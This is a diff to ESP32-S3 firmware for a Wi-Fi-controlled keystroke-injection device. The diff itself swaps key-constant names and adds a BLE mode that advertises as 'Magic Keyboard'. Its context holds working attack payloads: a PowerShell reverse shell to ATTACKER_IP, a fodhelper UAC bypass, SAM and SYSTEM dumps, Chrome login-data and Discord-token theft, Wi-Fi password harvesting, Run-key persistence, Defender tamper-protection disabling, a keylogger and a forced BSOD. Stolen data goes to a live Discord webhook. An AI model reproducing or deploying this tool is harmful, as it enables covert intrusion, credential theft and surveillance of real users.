@@ -19,6 +19,8 @@
  * =============================================================================
  */
 
+#include <Arduino.h>
+#include "hid_keyboard.h"
 #include "shared_protocol.h"
 
 // ==========================================
@@ -28,11 +30,8 @@
 #define ATTACKER_IP "192.168.0.103"
 // ==========================================
 
-#include <Arduino.h>
 String currentAttackerIP = ATTACKER_IP;
 String currentAttackerPort = "4444";
-#include <USB.h>
-#include <USBHIDKeyboard.h>
 #include <WebServer.h>
 #include <WebSocketsServer.h>
 #include <WiFi.h>
@@ -57,7 +56,9 @@ String currentAttackerPort = "4444";
 // =====================================================================
 // Global Objects
 // =====================================================================
-static USBHIDKeyboard Keyboard;
+#define BOOT_BUTTON_PIN 0  // GPIO0 = BOOT button on DevKitC-1
+static HIDKeyboard Keyboard;
+static HIDMode currentHIDMode = HID_MODE_USB;
 static WebServer server(WS_PORT);
 static WebSocketsServer webSocket(81);
 
@@ -183,10 +184,7 @@ static void releaseAllKeys();
 // =====================================================================
 // CapsLock LED Callback (called when PC sends LED status to keyboard)
 // =====================================================================
-static void onKeyboardLedEvent(void *handler_args, esp_event_base_t base,
-                               int32_t id, void *event_data) {
-  arduino_usb_hid_keyboard_event_data_t *data =
-      (arduino_usb_hid_keyboard_event_data_t *)event_data;
+static void onKeyboardLedEvent(hid_kbd_led_event_t *data) {
   capsLockLed = data->capslock;
   capsLockLedChanged = true;
 }
@@ -234,43 +232,43 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
     // --- Web Keyboard: simple text-based protocol ---
     // Special keys sent as named strings; characters sent as-is
     if (msg == "Enter") {
-      Keyboard.press(KEY_RETURN);
+      Keyboard.press(HK_KEY_RETURN);
       delay(20);
       Keyboard.releaseAll();
       LOG("[WebKB] Enter\n");
     } else if (msg == "Backspace") {
-      Keyboard.press(KEY_BACKSPACE);
+      Keyboard.press(HK_KEY_BACKSPACE);
       delay(20);
       Keyboard.releaseAll();
       LOG("[WebKB] Backspace\n");
     } else if (msg == "Tab") {
-      Keyboard.press(KEY_TAB);
+      Keyboard.press(HK_KEY_TAB);
       delay(20);
       Keyboard.releaseAll();
       LOG("[WebKB] Tab\n");
     } else if (msg == "Escape") {
-      Keyboard.press(KEY_ESC);
+      Keyboard.press(HK_KEY_ESC);
       delay(20);
       Keyboard.releaseAll();
       LOG("[WebKB] Escape\n");
     } else if (msg == "ArrowUp") {
-      Keyboard.press(KEY_UP_ARROW);
+      Keyboard.press(HK_KEY_UP_ARROW);
       delay(20);
       Keyboard.releaseAll();
     } else if (msg == "ArrowDown") {
-      Keyboard.press(KEY_DOWN_ARROW);
+      Keyboard.press(HK_KEY_DOWN_ARROW);
       delay(20);
       Keyboard.releaseAll();
     } else if (msg == "ArrowLeft") {
-      Keyboard.press(KEY_LEFT_ARROW);
+      Keyboard.press(HK_KEY_LEFT_ARROW);
       delay(20);
       Keyboard.releaseAll();
     } else if (msg == "ArrowRight") {
-      Keyboard.press(KEY_RIGHT_ARROW);
+      Keyboard.press(HK_KEY_RIGHT_ARROW);
       delay(20);
       Keyboard.releaseAll();
     } else if (msg == "CapsLock") {
-      Keyboard.press(KEY_CAPS_LOCK);
+      Keyboard.press(HK_KEY_CAPS_LOCK);
       delay(20);
       Keyboard.releaseAll();
       LOG("[WebKB] CapsLock\n");
@@ -279,119 +277,119 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
       String combo = msg.substring(4);
       LOG("[WebKB] combo: %s\n", combo.c_str());
       if (combo == "CapsLock") {
-        Keyboard.press(KEY_CAPS_LOCK);
+        Keyboard.press(HK_KEY_CAPS_LOCK);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Win+Space") {
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press(' ');
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Win+D") {
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('d');
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Ctrl+Shift+Esc") {
-        Keyboard.press(KEY_LEFT_CTRL);
-        Keyboard.press(KEY_LEFT_SHIFT);
-        Keyboard.press(KEY_ESC);
+        Keyboard.press(HK_KEY_LEFT_CTRL);
+        Keyboard.press(HK_KEY_LEFT_SHIFT);
+        Keyboard.press(HK_KEY_ESC);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Win+L") {
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('l');
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Ctrl+C") {
-        Keyboard.press(KEY_LEFT_CTRL);
+        Keyboard.press(HK_KEY_LEFT_CTRL);
         Keyboard.press('c');
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Ctrl+V") {
-        Keyboard.press(KEY_LEFT_CTRL);
+        Keyboard.press(HK_KEY_LEFT_CTRL);
         Keyboard.press('v');
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Ctrl+Z") {
-        Keyboard.press(KEY_LEFT_CTRL);
+        Keyboard.press(HK_KEY_LEFT_CTRL);
         Keyboard.press('z');
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Ctrl+A") {
-        Keyboard.press(KEY_LEFT_CTRL);
+        Keyboard.press(HK_KEY_LEFT_CTRL);
         Keyboard.press('a');
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Alt+Tab") {
-        Keyboard.press(KEY_LEFT_ALT);
-        Keyboard.press(KEY_TAB);
+        Keyboard.press(HK_KEY_LEFT_ALT);
+        Keyboard.press(HK_KEY_TAB);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Alt+F4") {
-        Keyboard.press(KEY_LEFT_ALT);
-        Keyboard.press(KEY_F4);
+        Keyboard.press(HK_KEY_LEFT_ALT);
+        Keyboard.press(HK_KEY_F4);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "PrtSc") {
-        Keyboard.press(KEY_PRINT_SCREEN);
+        Keyboard.press(HK_KEY_PRINT_SCREEN);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Win+R") {
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Delete") {
-        Keyboard.press(KEY_DELETE);
+        Keyboard.press(HK_KEY_DELETE);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Insert") {
-        Keyboard.press(KEY_INSERT);
+        Keyboard.press(HK_KEY_INSERT);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Home") {
-        Keyboard.press(KEY_HOME);
+        Keyboard.press(HK_KEY_HOME);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "End") {
-        Keyboard.press(KEY_END);
+        Keyboard.press(HK_KEY_END);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "PageUp") {
-        Keyboard.press(KEY_PAGE_UP);
+        Keyboard.press(HK_KEY_PAGE_UP);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "PageDown") {
-        Keyboard.press(KEY_PAGE_DOWN);
+        Keyboard.press(HK_KEY_PAGE_DOWN);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "F11") {
-        Keyboard.press(KEY_F11);
+        Keyboard.press(HK_KEY_F11);
         delay(20);
         Keyboard.releaseAll();
       } else if (combo == "Shutdown") {
         // shutdown /s /t 0 via Win+R
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("shutdown /s /t 0");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] Shutdown\n");
       } else if (combo == "Restart") {
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("shutdown /r /t 0");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] Restart\n");
@@ -405,14 +403,14 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         }
       } else if (combo == "BSOD") {
         // Real BSOD via taskkill csrss (requires admin via fodhelper UAC bypass)
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("cmd");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(1000);
@@ -425,7 +423,7 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "Start-Sleep -s 3;"
             "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] BSOD triggered\n");
@@ -433,14 +431,14 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         // Capture screenshot & send to Discord webhook
         // Command too long for Win+R (259 limit), so open cmd first
         // 1. Open cmd via Win+R
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("cmd");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(1000);
@@ -458,21 +456,21 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "ciyqaBjdfxN4zgmmvD3;"
             "Remove-Item $p\" & exit");
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] Screenshot sent to Discord\n");
       } else if (combo == "RevShell+") {
         // Full reverse shell via cmd (bypass Win+R 259 limit)
         // 1. Open cmd via Win+R
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("cmd");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(1000);
@@ -490,20 +488,20 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "$s.Flush()};"
             "$c.Close()\" & exit");
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] RevShell+ launched\n");
       } else if (combo == "AdminRevShell") {
         // Fodhelper UAC Bypass + Reverse Shell (Runs as SYSTEM/High Integrity)
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("cmd");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(1000);
@@ -517,20 +515,20 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "Start-Sleep -s 5;" +
             "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] AdminRevShell launched\n");
       } else if (combo == "UACBypass") {
         // Fodhelper UAC Bypass Demonstration (Auto-elevates to Admin without prompt if user is in Admin group)
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("cmd");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(1000);
@@ -543,20 +541,20 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "Start-Sleep -s 3;"
             "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] UACBypass launched\n");
       } else if (combo == "ChromeExfil") {
         // Exfiltrate Chrome Local State and Login Data to Discord
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("cmd");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(1000);
@@ -576,20 +574,20 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "try { Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -Form @{file=$h} } catch { };"
             "Remove-Item $w -Recurse -Force;Remove-Item $t -Force\" & exit");
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] ChromeExfil launched\n");
       } else if (combo == "DiscordGrabber") {
         // Exfiltrate Discord Tokens to Webhook
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("cmd");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(1000);
@@ -606,20 +604,20 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "Remove-Item $f -Force}}"
             "\" & exit");
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] DiscordGrabber launched\n");
       } else if (combo == "SAMDump") {
         // Exfiltrate SAM & SYSTEM via UAC Bypass (fodhelper) to Discord
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("cmd");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(1000);
@@ -639,20 +637,20 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "Start-Sleep -s 5;"
             "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] SAMDump launched\n");
       } else if (combo == "WiFiHarvest") {
         // Extract all saved WiFi passwords and send to Discord
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("cmd");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(1000);
@@ -670,20 +668,20 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "Remove-Item $w -Recurse -Force;"
             "Remove-Item ($w+'.zip') -Force\" & exit");
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] WiFiHarvest launched\n");
       } else if (combo == "Persistence") {
         // Write Reverse Shell to %APPDATA%\syslog.ps1 and add to Registry Run Key
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("cmd");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(1000);
@@ -692,7 +690,7 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysLog /t REG_SZ /d \\\"powershell -w h -nop -ep bypass -f %APPDATA%\\s.ps1\\\" /f && " +
             "powershell -w h -nop -ep bypass -f %APPDATA%\\s.ps1 & exit");
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] Persistence launched\n");
@@ -701,14 +699,14 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         // Bypasses script detection by acting as a legitimate user interacting with Settings
         
         // 1. Open Windows Security Threat Settings directly via URI
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("windowsdefender://threatsettings");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         
@@ -724,11 +722,11 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(1500); 
         
         // 3. Navigate UAC (Left Arrow -> Enter for "Yes")
-        Keyboard.press(KEY_LEFT_ARROW);
+        Keyboard.press(HK_KEY_LEFT_ARROW);
         delay(20);
         Keyboard.releaseAll();
         delay(100);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         
@@ -736,8 +734,8 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(1000);
         
         // Close the Windows Security Window (ALT + F4)
-        Keyboard.press(KEY_LEFT_ALT);
-        Keyboard.press(KEY_F4);
+        Keyboard.press(HK_KEY_LEFT_ALT);
+        Keyboard.press(HK_KEY_F4);
         delay(20);
         Keyboard.releaseAll();
         
@@ -748,27 +746,27 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         // If ON: UIAutomation clicks the toggle, triggers UAC, we bypass UAC, then close.
         // If OFF: Does nothing, leaves it OFF. Bypasses Tamper Protection!
         
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("windowsdefender://threatsettings");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(3000); // Wait for Windows Security to load
         
         // Run PowerShell script via Win+R -> cmd to check state and trigger space only if ON
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
         Keyboard.print("cmd");
         delay(200);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         delay(1000);
@@ -788,7 +786,7 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "(New-Object -Com WScript.Shell).SendKeys('%{F4}')\" & exit");
             
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         
@@ -796,7 +794,7 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
       } else if (combo == "Keylogger") {
         // Keylogger via GetAsyncKeyState → Discord webhook
         // Educational/lab use only
-        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press(HK_KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
@@ -805,7 +803,7 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         // Run the user-provided PowerShell Keylogger script directly into a PowerShell console
         Keyboard.print("powershell");
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         
@@ -836,20 +834,27 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         );
             
         delay(300);
-        Keyboard.press(KEY_RETURN);
+        Keyboard.press(HK_KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] Keylogger launched via PowerShell Window\n");
+      } else if (combo == "ReleaseAll") {
+        Keyboard.releaseAll();
+        LOG("[WebKB] Panic: Released all keys\n");
       } else {
         LOG("[WebKB] unknown combo: %s\n", combo.c_str());
       }
+    } else if (msg.startsWith("CMD:TYPE:")) {
+      String textToType = msg.substring(9);
+      LOG("[WebKB] Type Text: %s\n", textToType.c_str());
+      Keyboard.print(textToType.c_str());
     // --- Run Script: "RUNCMD:<command>" ---
     // Opens Win+R, types command, presses Enter, then Esc×2 to dismiss errors
     } else if (msg.startsWith("RUNCMD:")) {
       String cmd = msg.substring(7);
       LOG("[WebKB] RunScript: %s\n", cmd.c_str());
       // 1. Win+R
-      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press(HK_KEY_LEFT_GUI);
       Keyboard.press('r');
       delay(20);
       Keyboard.releaseAll();
@@ -858,16 +863,16 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
       Keyboard.print(cmd.c_str());
       delay(300);
       // 3. Enter
-      Keyboard.press(KEY_RETURN);
+      Keyboard.press(HK_KEY_RETURN);
       delay(20);
       Keyboard.releaseAll();
       // 4. After delay, Esc×2 to dismiss any error
       delay(3000);
-      Keyboard.press(KEY_ESC);
+      Keyboard.press(HK_KEY_ESC);
       delay(20);
       Keyboard.releaseAll();
       delay(200);
-      Keyboard.press(KEY_ESC);
+      Keyboard.press(HK_KEY_ESC);
       delay(20);
       Keyboard.releaseAll();
       LOG("[WebKB] RunScript done\n");
@@ -917,11 +922,7 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
 // Forward HID Report → USB HID Keyboard to PC
 // =====================================================================
 static void forwardReportToPC(const kbd_report_t &report) {
-  KeyReport kr;
-  kr.modifiers = report.modifier;
-  kr.reserved = 0;
-  memcpy(kr.keys, report.keycodes, 6);
-  Keyboard.sendReport(&kr);
+  Keyboard.sendRawReport(report.modifier, report.keycodes);
 }
 
 static void releaseAllKeys() { Keyboard.releaseAll(); }
@@ -1067,10 +1068,25 @@ void setup() {
   LOGLN("  ESP32-S3 USB HID Bridge — DEVICE / RX");
   LOGLN("========================================");
 
-  USB.begin();
-  Keyboard.begin();
-  Keyboard.onEvent(ARDUINO_USB_HID_KEYBOARD_LED_EVENT, onKeyboardLedEvent);
-  LOGLN("[USB HID] Keyboard device started (LED callback registered)");
+  // --- Boot Mode Selection ---
+  // Hold BOOT button (GPIO0) during startup → BLE mode
+  // Normal boot → USB HID mode (default)
+  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);
+  delay(100); // debounce
+  if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
+    currentHIDMode = HID_MODE_BLE;
+    LOGLN("[MODE] >>> BLE HID KEYBOARD MODE <<<");
+    LOGLN("[MODE] Advertising as 'Magic Keyboard'");
+  } else {
+    currentHIDMode = HID_MODE_USB;
+    LOGLN("[MODE] >>> USB HID KEYBOARD MODE <<<");
+  }
+
+  Keyboard.begin(currentHIDMode);
+  if (currentHIDMode == HID_MODE_USB) {
+    Keyboard.onEvent(onKeyboardLedEvent);
+    LOGLN("[USB HID] Keyboard device started (LED callback registered)");
+  }
 
   initWiFiAndEspNow();
   initWebServer();
@@ -1080,6 +1096,7 @@ void setup() {
   lastPacketTime = millis();
 
   LOGLN("[Ready] Waiting for ESP-NOW packets...");
+  LOG("[Mode] Active: %s\n", Keyboard.getModeName().c_str());
   LOGLN("========================================");
 }
 
@@ -1100,13 +1117,22 @@ void loop() {
     LOG("[LED] CapsLock=%d\n", capsLockLed ? 1 : 0);
   }
 
+  // --- Periodic Web Monitor Broadcasts (BLE Status) ---
+  static unsigned long lastBleStatusTime = 0;
+  if (currentHIDMode == HID_MODE_BLE && (millis() - lastBleStatusTime > 2000)) {
+    lastBleStatusTime = millis();
+    String bleStatusMsg = "BLE:STATUS:";
+    bleStatusMsg += Keyboard.isConnected() ? "Connected" : "Waiting";
+    webSocket.broadcastTXT(bleStatusMsg);
+  }
+
   // --- Language Detection State Machine ---
   switch (ldState) {
   case LD_IDLE:
     break;
   case LD_ENSURE_CAPS_OFF:
     if (capsLockLed) {
-      Keyboard.press(KEY_CAPS_LOCK);
+      Keyboard.press(HK_KEY_CAPS_LOCK);
       delay(20);
       Keyboard.releaseAll();
       ldState = LD_WAIT_CAPS_OFF;
@@ -1123,7 +1149,7 @@ void loop() {
     }
     break;
   case LD_OPEN_RUN:
-    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press(HK_KEY_LEFT_GUI);
     Keyboard.press('r');
     delay(20);
     Keyboard.releaseAll();
@@ -1155,7 +1181,7 @@ void loop() {
     }
     break;
   case LD_PRESS_ENTER:
-    Keyboard.press(KEY_RETURN);
+    Keyboard.press(HK_KEY_RETURN);
     delay(20);
     Keyboard.releaseAll();
     ldState = LD_WAIT_RESULT;
@@ -1169,11 +1195,11 @@ void loop() {
     break;
   case LD_DISMISS_ERROR:
     // Press Escape twice: 1st closes error dialog, 2nd closes Win+R
-    Keyboard.press(KEY_ESC);
+    Keyboard.press(HK_KEY_ESC);
     delay(20);
     Keyboard.releaseAll();
     delay(200);
-    Keyboard.press(KEY_ESC);
+    Keyboard.press(HK_KEY_ESC);
     delay(20);
     Keyboard.releaseAll();
     delay(100);
@@ -1194,7 +1220,7 @@ void loop() {
     break;
   case LD_RESTORE_CAPS:
     // Restore CapsLock back to OFF after English detection
-    Keyboard.press(KEY_CAPS_LOCK);
+    Keyboard.press(HK_KEY_CAPS_LOCK);
     delay(20);
     Keyboard.releaseAll();
     ldState = LD_SEND_RESULT;
